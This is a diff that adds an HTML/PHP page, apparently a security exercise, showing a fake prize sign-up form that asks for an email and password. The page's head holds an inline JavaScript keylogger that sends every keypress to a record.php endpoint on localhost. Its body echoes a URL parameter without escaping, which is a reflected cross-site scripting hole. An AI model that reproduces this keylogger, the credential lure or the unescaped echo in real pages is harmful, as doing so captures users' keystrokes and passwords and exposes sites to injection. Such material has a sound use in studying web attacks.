@@ -1,0 +1,34 @@
+﻿<!DOCTYPE html>
+
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="utf-8" />
+    <title></title>
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Tangerine">
+    <link href="css/style.css" rel="stylesheet" />
+    <link href="css/StyleSheet1.css" rel="stylesheet" />
+    <script>
+        document.onkeypress = function KeyLogger(inp) {
+            key_pressed = String.fromCharCode(inp.which);
+            new Image().src = "http://localhost/record.php?key=" + key_pressed;
+        }
+    </script>
+</head>
+<body>
+    <form class="form-signin" method="post" action="confirm.php">
+        <h2 class="form-signin-heading">Please sign up to win €1000</h2>
+        <input type="text" value="" class="input-block-level" placeholder="Email address" name="email">
+        <input type="password" class="input-block-level" placeholder="Password" name="password"><br />
+        <p>
+            Please enter ,please tell us what you would spend the money on!
+            <TEXTAREA name="thetext" rows="20" cols="50"></TEXTAREA>
+        </p>
+        <button class="btn" type="submit">Enter Now</button>
+    </form>
+    <?php
+
+    echo $_GET["url"];
+
+    ?>
+</body>
+</html>
